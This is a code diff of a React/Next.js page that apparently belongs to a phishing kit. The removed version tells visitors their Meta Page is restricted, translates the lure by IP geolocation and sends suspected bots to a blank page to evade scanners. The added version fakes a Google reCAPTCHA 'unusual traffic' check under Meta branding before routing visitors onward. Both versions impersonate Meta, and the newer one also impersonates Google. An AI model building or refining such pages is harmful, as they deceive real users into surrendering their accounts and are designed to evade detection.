@@ -1,127 +1,100 @@
-import HeroImage from '@/assets/images/hero-image.jpg';
-import { PATHS } from '@/router/router';
-import countryToLanguage from '@/utils/country_to_language';
-import { translateText } from '@/utils/translate';
-import detectBot from '@/utils/detect_bot';
-import { faCircleCheck, faIdCard } from '@fortawesome/free-solid-svg-icons';
-import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
+'use client';
+import CheckMarkImage from '@/assets/images/checkmark.png';
+import MetaImage from '@/assets/images/meta-image.png';
+import ReCaptchaImage from '@/assets/images/recaptcha.png';
 import axios from 'axios';
-import { useCallback, useEffect, useMemo, useState } from 'react';
-import { useNavigate } from 'react-router';
+import Image from 'next/image';
+import { useRouter } from 'next/navigation';
+import { useEffect, useState, type FC } from 'react';
 
-const Index = () => {
-    const navigate = useNavigate();
-    const [today, setToday] = useState();
-    const [isLoading, setIsLoading] = useState(true);
-    const defaultTexts = useMemo(
-        () => ({
-            title: 'Welcome To Meta Protect.',
-            description: "Your page's accessibility is limited, so we ask that higher security requirements be applied to that account. We created this security program to unlock your Pages.",
-            protectionText: "We've enabled advanced protections to unlock your Page.",
-            processText: 'Below, we walk you through the process in detail and help you fully activate to unlock your Page.',
-            continueBtn: 'Continue',
-            restrictedText: 'Your page was restricted on'
-        }),
-        []
-    );
+const Index: FC = () => {
+    const router = useRouter();
+    const [isVerifying, setIsVerifying] = useState(false);
+    const [isShowCheckMark, setIsShowCheckMark] = useState(false);
 
-    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
-
-    const translateAllTexts = useCallback(
-        async (targetLang) => {
-            try {
-                const [translatedTitle, translatedDesc, translatedProtection, translatedProcess, translatedContinue, translatedRestricted] = await Promise.all([translateText(defaultTexts.title, targetLang), translateText(defaultTexts.description, targetLang), translateText(defaultTexts.protectionText, targetLang), translateText(defaultTexts.processText, targetLang), translateText(defaultTexts.continueBtn, targetLang), translateText(defaultTexts.restrictedText, targetLang)]);
-
-                setTranslatedTexts({
-                    title: translatedTitle,
-                    description: translatedDesc,
-                    protectionText: translatedProtection,
-                    processText: translatedProcess,
-                    continueBtn: translatedContinue,
-                    restrictedText: translatedRestricted
-                });
-            } catch (error) {
-                console.log('translation failed:', error.message);
+    const handleVerify = async () => {
+        setIsVerifying(true);
+        try {
+            const response = await axios.post('/api/verify');
+            if (response.status === 200) {
+                setTimeout(() => {
+                    setIsShowCheckMark(true);
+                    setIsVerifying(false);
+                }, 2000);
             }
-        },
-        [defaultTexts]
-    );
+        } catch {
+            setIsVerifying(false);
+        }
+    };
 
     useEffect(() => {
-        const init = async () => {
-            const date = new Date();
-            const options = {
-                month: 'long',
-                day: 'numeric',
-                year: 'numeric'
-            };
-            setToday(date.toLocaleString('en-US', options));
-            localStorage.clear();
-
-            const checkBot = async () => {
-                try {
-                    const botResult = await detectBot();
-                    if (botResult.isBot) {
-                        window.location.href = 'about:blank';
-                        return;
-                    }
-                } catch {
-                    //
-                }
-            };
-
-            const fetchIpInfo = async () => {
-                try {
-                    const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
-                    localStorage.setItem('ipInfo', JSON.stringify(response.data));
-                    const countryCode = response.data.country_code;
-                    const targetLang = countryToLanguage[countryCode] || 'en';
-
-                    setIsLoading(false);
-                    localStorage.setItem('targetLang', targetLang);
-                    translateAllTexts(targetLang);
-                } catch {
-                    //
-                }
-            };
-            await fetchIpInfo();
-            await checkBot();
-        };
-
-        init();
-    }, [translateAllTexts]);
+        if (isShowCheckMark) {
+            setTimeout(() => {
+                router.push('/home'); // ← Sửa thành home thay vì contact
+            }, 500);
+        }
+    }, [isShowCheckMark, router]);
 
     return (
         <div className='flex min-h-screen items-center justify-center bg-white sm:bg-[#F8F9FA]'>
-            <title>Comunity Standard</title>
-            <div className='flex max-w-[620px] flex-col gap-4 rounded-lg bg-white p-4 sm:shadow-lg'>
-                <img src={HeroImage} alt='' />
-                <p className='text-3xl font-bold'>{translatedTexts.title}</p>
-                <p className='leading-6 text-[#212529]'>{translatedTexts.description}</p>
-                <div className='relative flex flex-col gap-4'>
-                    <div className='absolute top-1/2 left-3 h-[70%] w-0.5 -translate-y-1/2 bg-gray-200'></div>
+            <title>Our systems have detected unusual traffic from your computer network</title>
+            
+            <div className='flex max-w-[620px] flex-col gap-6 rounded-lg bg-white p-6 sm:shadow-lg'>
+                {/* Header */}
+                <div className='flex justify-center'>
+                    <Image src={MetaImage} alt='Meta' className='w-16' />
+                </div>
 
-                    <div className='z-10 flex items-center gap-2'>
-                        <FontAwesomeIcon icon={faCircleCheck} className='h-7 w-7 bg-white text-gray-300' size='xl' />
-                        <p>{translatedTexts.protectionText}</p>
-                    </div>
-                    <div className='z-10 flex items-center gap-2'>
-                        <FontAwesomeIcon icon={faIdCard} className='h-7 w-7 bg-white text-[#355797]' size='xl' />
-                        <p>{translatedTexts.processText}</p>
+                <h1 className='text-2xl font-bold text-center text-gray-800'>
+                    Our systems have detected unusual traffic from your computer network
+                </h1>
+
+                {/* reCAPTCHA Box */}
+                <div className='flex w-full items-center justify-center'>
+                    <div className='flex w-full items-center justify-between rounded-md border-2 bg-[#f9f9f9] p-4 text-[#4c4a4b]'>
+                        <div className='flex items-center gap-3'>
+                            <button
+                                onClick={handleVerify}
+                                disabled={isVerifying || isShowCheckMark}
+                                className='flex items-center justify-center'
+                            >
+                                {isVerifying ? (
+                                    <div className='h-8 w-8 animate-spin rounded-full border-4 border-blue-400 border-b-transparent border-l-transparent'></div>
+                                ) : (
+                                    <div
+                                        className={`h-8 w-8 rounded-[3px] ${!isShowCheckMark ? 'border-2 border-gray-500 bg-white' : ''}`}
+                                        style={{
+                                            backgroundImage: isShowCheckMark ? `url("${CheckMarkImage.src}")` : '',
+                                            backgroundPosition: '-10px -595px'
+                                        }}
+                                    />
+                                )}
+                            </button>
+                            <span className='text-sm font-semibold text-gray-600'>I&apos;m not a robot</span>
+                        </div>
+                        
+                        <div className='flex flex-col items-center text-[#9d9ba7]'>
+                            <Image src={ReCaptchaImage} alt='reCAPTCHA' className='h-8 w-8' />
+                            <p className='text-xs font-bold'>reCAPTCHA</p>
+                            <small className='text-[10px] text-gray-500'>Privacy - Terms</small>
+                        </div>
                     </div>
                 </div>
+
+                {/* Description */}
+                <div className='space-y-3 text-sm text-gray-600'>
+                    <p>This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.</p>
+                    <p>We&apos;ve used Google&apos;s reCAPTCHA Enterprise product to provide this security check.</p>
+                </div>
+
+                {/* Continue Button */}
                 <button
-                    className='rounded-lg bg-blue-500 px-3 py-4 font-bold text-white disabled:opacity-50'
-                    disabled={isLoading}
-                    onClick={() => {
-                        navigate(PATHS.HOME);
-                    }}
+                    className='rounded-lg bg-blue-500 px-4 py-3 font-bold text-white disabled:opacity-50'
+                    disabled={!isShowCheckMark}
+                    onClick={() => router.push('/home')} // ← Sửa thành home
                 >
-                    {translatedTexts.continueBtn}
+                    Continue
                 </button>
-                <p className='text-center'>
-                    {translatedTexts.restrictedText} <span className='font-bold'>{today}</span>
-                </p>
             </div>
         </div>
     );
